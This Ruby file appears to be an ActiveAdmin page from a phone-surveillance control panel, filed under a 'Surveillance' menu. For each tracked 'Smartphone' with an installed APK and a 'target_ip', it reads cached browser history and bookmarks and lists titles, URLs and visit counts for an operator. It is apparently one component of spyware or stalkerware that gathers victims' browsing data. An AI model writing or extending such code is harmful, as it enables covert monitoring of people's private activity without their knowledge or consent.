ActiveAdmin.register_page "Browser History" do
  menu parent: "👁 Surveillance", priority: 10, label: "🌐 Browser History"

  content do
    div class: "browser-history-page", style: "padding: 20px; background: #161b22; min-height: 80vh;" do
      h2 "🌐 Browser History & Bookmarks", style: "color: #00ff41; margin-bottom: 20px;"

      smartphones = Smartphone.all
      smartphones.each do |device|
        device_id = device.apk_installation&.target_ip || device.id.to_s
        data = Rails.cache.read("browser_history:#{device_id}") rescue nil

        panel "📱 #{device.name || device_id}", style: "background: #0d1117; border: 1px solid #30363d;" do
          if data
            if data[:history].present?
              h4 "📜 History (#{data[:history].size})", style: "color: #58a6ff;"
              table_for (data[:history] || []).first(50) do |t|
                t.column("Title") { |h| span (h["title"] || h[:title] || "").truncate(60), style: "color: #e0e0e0;" }
                t.column("URL") { |h| 
                  url = h["url"] || h[:url] || ""
                  link_to url.truncate(50), url, target: "_blank", style: "color: #58a6ff;"
                }
                t.column("Visits") { |h| h["visits"] || h[:visits] }
              end
            end

            if data[:bookmarks].present?
              h4 "⭐ Bookmarks (#{data[:bookmarks].size})", style: "color: #f0883e; margin-top: 20px;"
              table_for (data[:bookmarks] || []).first(50) do |t|
                t.column("Title") { |b| span (b["title"] || b[:title] || ""), style: "color: #e0e0e0;" }
                t.column("URL") { |b|
                  url = b["url"] || b[:url] || ""
                  link_to url.truncate(50), url, target: "_blank", style: "color: #58a6ff;"
                }
              end
            end

            para "Updated: #{data[:received_at]}", style: "color: #666; font-size: 12px;" if data[:received_at]
          else
            para "No browser data available yet.", style: "color: #666; font-style: italic;"
          end
        end
      end
    end
  end
end
